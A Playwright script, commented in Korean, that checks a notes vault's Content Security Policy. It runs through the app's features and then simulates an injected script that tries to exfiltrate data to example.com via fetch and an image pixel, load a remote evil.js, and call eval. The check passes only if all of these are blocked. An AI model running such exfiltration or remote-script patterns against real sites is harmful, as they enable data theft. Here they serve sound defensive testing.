// 배포 빌드에서 콘텐츠 보안 정책(CSP)이 앱을 막지 않는지, 그리고 바깥으로 보내는 것을 실제로 막는지 확인한다.
//   pnpm --filter @vault/web build && pnpm --filter @vault/web preview   (다른 터미널)
//   node scripts/csp-check.mjs [http://localhost:4173]
import { chromium } from '@playwright/test';

const base = process.argv[2] ?? 'http://localhost:4173';
const PASSWORD = 'csp 보라색 자전거 달력 소나무'; // 점검 전용 값
const violations = [];
const errors = [];

const browser = await chromium.launch({ channel: 'chrome' });
const page = await (await browser.newContext({ locale: 'ko-KR', viewport: { width: 1280, height: 800 } })).newPage();
page.on('console', (m) => {
  const t = m.text();
  if (/Content Security Policy|Refused to/.test(t)) violations.push(t.slice(0, 200));
});
page.on('pageerror', (e) => errors.push(e.message));

await page.goto(base);
const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
if (!policy) throw new Error('CSP meta가 없다. 개발 서버가 아니라 빌드 결과(preview)로 열었는지 확인.');

// 암호화(libsodium wasm), 비밀번호 강도(지연 로딩), 편집기(CodeMirror 스타일 주입)를 한 바퀴 돈다
await page.locator('#pw').fill(PASSWORD);
await page.locator('#pw2').fill(PASSWORD);
await page.getByRole('button', { name: '열쇠 만들기' }).click();
await page.getByRole('button', { name: '적어두었습니다' }).click();
await page.getByLabel('빠른 메모').fill('정책 점검 메모');
await page.getByLabel('빠른 메모').press('Enter');
await page.locator('.note-row', { hasText: '정책 점검 메모' }).click();
await page.locator('.cm-content').click();
await page.keyboard.type('본문 [[링크]] #태그');
await page.getByRole('button', { name: '잠금', exact: true }).click();
await page.locator('#pw').fill(PASSWORD);
await page.getByRole('button', { name: '열기', exact: true }).click();
await page.locator('.note-row', { hasText: '정책 점검 메모' }).click();
const body = await page.locator('.cm-content').textContent();
await page.locator('.sidebar').getByRole('button', { name: '설정' }).click();
await page.locator('#usage').scrollIntoViewIfNeeded();
const before = [...violations];
const appOk = before.length === 0 && errors.length === 0 && (body ?? '').includes('본문');

// 악성 스크립트가 끼어들었다고 치고: 허용 목록 밖으로 보내기, 바깥 스크립트 불러오기, eval
const blocked = await page.evaluate(async () => {
  const out = {};
  out.fetch = await fetch('https://example.com/steal', { method: 'POST', body: 'x', mode: 'no-cors' }).then(() => false, () => true);
  out.image = await new Promise((r) => {
    const i = new Image();
    i.onload = () => r(false);
    i.onerror = () => r(true);
    i.src = 'https://example.com/pixel.png?d=x';
  });
  out.script = await new Promise((r) => {
    const s = document.createElement('script');
    s.onload = () => r(false);
    s.onerror = () => r(true);
    s.src = 'https://example.com/evil.js';
    document.head.appendChild(s);
  });
  try {
    out.eval = !(0, eval)('1');
  } catch {
    out.eval = true;
  }
  return out;
});
await browser.close();

console.log('app works under CSP:', appOk, { violations: before, errors });
console.log('blocked:', blocked);
if (!appOk || Object.values(blocked).some((v) => !v)) process.exit(1);
console.log('ok');
